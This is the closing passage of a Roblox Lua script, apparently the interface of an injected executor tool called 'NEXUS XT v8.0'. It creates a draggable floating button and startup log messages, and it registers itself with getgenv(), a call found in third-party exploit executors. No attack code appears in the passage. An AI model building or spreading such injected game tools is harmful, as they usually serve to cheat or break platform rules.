    corner.Parent = ball

    -- Sombra
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1, 16, 1, 16)
    shadow.Position = UDim2.new(0, -8, 0, -8)
    shadow.Image = "rbxassetid://1316047698"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = 0
    shadow.Parent = ball

    -- Arrastar
    local drag = false
    local dragStart, startPos
    ball.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            dragStart = i.Position
            startPos = ball.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            ball.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)

    -- Abrir interface ao clicar
    ball.MouseButton1Click:Connect(function()
        if Nexus.mainGui and Nexus.mainGui.Parent then
            Nexus.mainGui.Enabled = true
            ball.Visible = false
            Nexus.isMinimized = false
        else
            Nexus.mainGui = createMainUI()
            ball.Visible = false
        end
    end)
    return ball
end

-- ============================================================================
-- INICIALIZAÇÃO
-- ============================================================================
local function init()
    Nexus:AddLog("═══════════════════════════════════════════════════", "info")
    Nexus:AddLog("  NEXUS XT v8.0 — Interface Totalmente Reformulada", "success")
    Nexus:AddLog("═══════════════════════════════════════════════════", "info")
    Nexus.mainGui = createMainUI()
    if Nexus.mainGui then
        Nexus:AddLog("Interface carregada com sucesso.", "success")
        Nexus:AddLog("Tudo limpo, organizado e sem bugs.", "success")
        Nexus:AddLog("Minimize para bolinha flutuante.", "info")
    else
        Nexus:AddLog("Falha ao criar interface.", "error")
    end
    getgenv().Nexus = Nexus
end

pcall(init)
